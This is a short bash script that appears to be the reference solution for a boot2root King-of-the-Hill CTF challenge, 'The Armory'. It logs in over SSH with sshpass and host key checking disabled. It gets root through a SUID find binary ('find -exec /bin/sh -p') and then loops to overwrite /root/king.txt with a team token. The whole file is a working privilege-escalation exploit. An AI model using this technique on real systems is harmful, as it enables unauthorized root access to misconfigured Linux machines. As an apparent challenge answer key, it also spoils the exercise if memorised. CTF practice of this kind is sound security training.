#!/usr/bin/env bash
# Reference holder for The Armory (boot2root KotH). Needs `sshpass`.
#   ./solve.sh HOST PORT <team_token> [password]
# Privesc: SUID find. `find <path> -exec /bin/sh -p \; -quit` keeps euid=root.
# Then hold at ROOT level (full points) by re-writing /root/king.txt each tick.
set -euo pipefail
HOST="${1:?usage: solve.sh HOST PORT <team_token> [password]}"; PORT="${2:?port}"
TOKEN="${3:?team token (CTFd King of the Hill page)}"; PW="${4:-player}"
sshpass -p "$PW" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  -p "$PORT" "player@$HOST" \
  "find /etc/hostname -exec /bin/sh -p -c 'echo [+] root=\$(id -u); while true; do printf %s \"$TOKEN\" > /root/king.txt; sleep 15; done' \;"
